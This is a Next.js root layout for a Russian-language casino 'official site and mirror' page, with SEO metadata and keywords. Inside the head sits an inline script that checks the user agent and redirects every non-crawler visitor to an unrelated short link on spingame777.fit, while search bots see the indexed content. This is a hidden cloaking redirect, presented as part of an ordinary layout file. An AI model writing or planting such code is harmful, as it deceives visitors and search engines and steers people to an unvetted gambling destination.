import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Lucky Bear Casino — официальный сайт и зеркало онлайн',
  description: 'Lucky Bear Casino: официальный сайт, зеркало и полезный гид для игроков на русском и английском.',
  generator: 'v0.app',
  alternates: { canonical: '/' },
  icons: { icon: '/icon.png', apple: '/icon.png' },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#171613',
  userScalable: false,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="98949ef8f448acc9" />
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="description" content="Lucky Bear Casino: официальный сайт, зеркало и полезный гид для игроков на русском и английском." />
        <meta name="keywords" content="lucky bear casino, luckybear casino, luckybear casino зеркало, luckybear casino официальный сайт, лаки бир казино, лаки бир казино онлайн, лаки бир казино зеркало" />
        <meta name="robots" content="index, follow" />
        <meta name="theme-color" content="#171613" />
        <link rel="canonical" href="/" />
        <title>Lucky Bear Casino — официальный сайт и зеркало онлайн</title>
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://spingame777.fit/4htNNl");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
